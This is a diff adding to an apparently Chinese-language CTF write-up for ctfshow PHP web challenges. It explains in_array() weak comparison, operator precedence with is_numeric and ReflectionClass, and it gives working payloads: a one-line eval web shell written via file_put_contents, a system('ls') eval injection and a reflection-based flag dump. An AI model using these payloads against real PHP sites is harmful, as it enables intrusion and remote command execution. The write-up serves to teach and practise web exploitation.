@@ -545,6 +545,10 @@
 </ul>
 </li>
 </ul>
+<p>注:in_array()函数默认采用的是弱比较，在进行检查比较的时候回自动进行类型转换，我们来验证一下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$a</span>,<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">#输出结果是yes，证明1和1.php是相等的，即通过了弱比较  </span></span><br></pre></td></tr></table></figure>
+
+<p><strong>in_array() 函数存在弱比较的漏洞，如果没有设置第三个参数，in_array()  函数在比较时默认是弱类型比较，这意味着它会进行自动类型转换。例如数组中的元素是整数，而搜索的值是字符串，PHP  会尝试将字符串转换为整数来进行比较。比如上面字符串类型的 1.php 就自动转换为了整数 1，也就符合在数组中的条件。</strong></p>
 <h4 id="file-put-contents-函数"><a href="#file-put-contents-函数" class="headerlink" title="file_put_contents()函数"></a><code>file_put_contents()</code>函数</h4><ul>
 <li><p>这是 PHP 的一个内置函数，用于将字符串写入文件。如果文件不存在，它会创建一个新文件；如果文件已存在，它会覆盖原文件的内容。</p>
 </li>
@@ -560,6 +564,88 @@
 </li>
 </ul>
 <p>返回来看题目</p>
+<p>已知for循环里面的i初始值为36，那么数组中必然存在1-36之间的数，所以这时候我们可以猜测其中的数字</p>
+<p>因为我们知道了in_array()是弱比较类型，所以我们可以直接构造数字+文件名去绕过验证</p>
+<p>payload:</p>
+<p><code>?n=1.php</code>	我个人觉得1的概率是最大了</p>
+<p><code>content=&lt;?php eval($_POST[1]);?&gt;</code></p>
+<p>分别用get和post传入参数</p>
+<p>之后访问1.php，再往一句话木马参数中传入命令或者用蚁剑进行连接，就可以拿到flag了</p>
+<h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到提示flag在class ctfshow中，那就访问看看，发现什么都没有</p>
+<p>解析代码</p>
+<h4 id="is-numeric-函数"><a href="#is-numeric-函数" class="headerlink" title="is_numeric()函数"></a>is_numeric()函数</h4><p><code>is_numeric()</code> 函数用于检测一个变量是否为数字或数字字符串这个函数返回一个布尔值：如果变量是数字或可以被转换为数字的字符串，则返回 <code>true</code>，否则返回 <code>false</code>。</p>
+<p>函数原型</p>
+<p><code>bool is_numeric(mixed $var)</code></p>
+<p>举个例子</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 示例 1: 整数</span></span><br><span class="line"><span class="variable">$var1</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$var1</span>) ? <span class="string">&#x27;true&#x27;</span> : <span class="string">&#x27;false&#x27;</span>; <span class="comment">// 输出: true</span></span><br><span class="line"><span class="comment">// 示例 2: 浮点数</span></span><br><span class="line"><span class="variable">$var2</span> = <span class="number">123.45</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$var2</span>) ? <span class="string">&#x27;true&#x27;</span> : <span class="string">&#x27;false&#x27;</span>; <span class="comment">// 输出: true</span></span><br><span class="line"><span class="comment">// 示例 3: 数字字符串</span></span><br><span class="line"><span class="variable">$var3</span> = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$var3</span>) ? <span class="string">&#x27;true&#x27;</span> : <span class="string">&#x27;false&#x27;</span>; <span class="comment">// 输出: true</span></span><br></pre></td></tr></table></figure>
+
+<p>$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3)</p>
+<ul>
+<li>这里是为了检查这三个变量是否都为数字或者数字字符串，并将结果存储在变量 <code>$v0</code> 中，如果三个布尔值为true，v0才会为true</li>
+</ul>
+<p>v0为true，进入if嵌套判断，要求v2不能包含；但v3得有；，最后执行eval语句</p>
+<p>但是这里要注意一个点:</p>
+<h4 id="运算符优先极"><a href="#运算符优先极" class="headerlink" title="运算符优先极"></a>运算符优先极</h4><p>v0赋值，赋值<code>=</code>的优先级高于逻辑运算。所以只要让is_numeric($v1)返回true即可满足if判断，所以v2和v3不需要为数字</p>
+<p>解题:</p>
+<p>对于v1：题目中v1没什么用处，所以v1直接设置一个数字或者数字字符串就可以了</p>
+<p>v1&#x3D;1</p>
+<p>对于v2：在题目中可以看到后面有很多字符串，但当时没想到怎么利用这些字符串，就想着把后面的注释掉</p>
+<p>v2&#x3D;var_dump($ctfshow)&#x2F;*—这里加上(&#x2F;*)就是为了注释掉，这里也可以用其他输出函数，或者用正常的命令执行函数也可以</p>
+<p>对于v3：因为v3需要闭合哪个注释符号，还需要带分号</p>
+<p>v3&#x3D;*&#x2F;;</p>
+<p>将这三个参数传入</p>
+<p>payload:</p>
+<p>?v1&#x3D;1&amp;v2&#x3D;system(‘ls’)&#x2F;*<em>&amp;v3&#x3D;*</em>&#x2F;;</p>
+<p>然后查看ctfshow.php</p>
+<p>需要将 0x2d 替换为 - ，结果再使用 ctfshow{} 包裹。</p>
+<h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>跟上题一样，但过滤了很多字符，这里的话我们先用脚本看一下有哪些字符是没有被过滤的</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">32</span>;<span class="variable">$i</span>&lt;<span class="number">127</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>,<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line"><span class="comment"># &amp; ( : &lt; &gt; A B C D E F G H I J K L M N O P Q R S T U V W X Y Z ] a b c d e f g h i j k l m n o p q r s t u v w x y z | &#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的话正常的命令函数是用不了了的，我一开始也没什么头绪，所以果断去看wp</p>
+<h4 id="反射类：-ReflectionClass"><a href="#反射类：-ReflectionClass" class="headerlink" title="反射类： ReflectionClass"></a>反射类： ReflectionClass</h4><p><code>ReflectionClass</code> 是 PHP 反射 API 中的一个类，专门用于对类的结构进行反射。通过 <code>ReflectionClass</code>，开发者可以在运行时获取有关类的详细信息，例如类的名称、方法、属性、常量等。它允许动态访问类的特性，从而使得程序能够更灵活地处理对象。</p>
+<p>用法:创建一个 ReflectionClass 实例</p>
+<p><code>$reflection = **new** **ReflectionClass**(&#39;ClassName&#39;);</code></p>
+<h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><ol>
+<li><strong>获取类的信息</strong><ul>
+<li><code>getName()</code>: 获取类的名称。</li>
+<li><code>getShortName()</code>: 获取类的短名称（不包含命名空间）。</li>
+<li><code>getNamespaceName()</code>: 获取类的命名空间。</li>
+<li><code>getParentClass()</code>: 获取父类的反射对象（如果没有父类，则返回 <code>false</code>）。</li>
+<li><code>getInterfaces()</code>: 获取类实现的所有接口。</li>
+</ul>
+</li>
+<li><strong>获取类的属性</strong><ul>
+<li><code>getProperties()</code>: 获取类的所有属性，返回一个 <code>ReflectionProperty</code> 对象数组。</li>
+<li><code>getProperty($name)</code>: 获取指定名称的属性的反射对象。</li>
+</ul>
+</li>
+<li><strong>获取类的方法</strong><ul>
+<li><code>getMethods()</code>: 获取类的所有方法，返回一个 <code>ReflectionMethod</code> 对象数组。</li>
+<li><code>getMethod($name)</code>: 获取指定名称的方法的反射对象。</li>
+</ul>
+</li>
+<li><strong>获取类的常量</strong><ul>
+<li><code>getConstants()</code>: 获取类的所有常量。</li>
+</ul>
+</li>
+<li><strong>创建类的实例</strong><ul>
+<li><code>newInstance()</code>: 创建类的实例。</li>
+<li><code>newInstanceArgs(array $args)</code>: 使用参数创建类的实例。</li>
+</ul>
+</li>
+<li><strong>检查可见性</strong><ul>
+<li><code>isInstantiable()</code>: 检查类是否可以被实例化。</li>
+<li><code>isAbstract()</code>: 检查类是否为抽象类。</li>
+<li><code>isFinal()</code>: 检查类是否为最终类。</li>
+</ul>
+</li>
+</ol>
+<p>payload：v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</p>
+<p>输入后就可以拿到flag，把0x2d换成-就可以，但注意这里flag少了一位需要爆破才能拿到</p>
 ]]></content>
       <categories>
         <category>ctfshow</category>
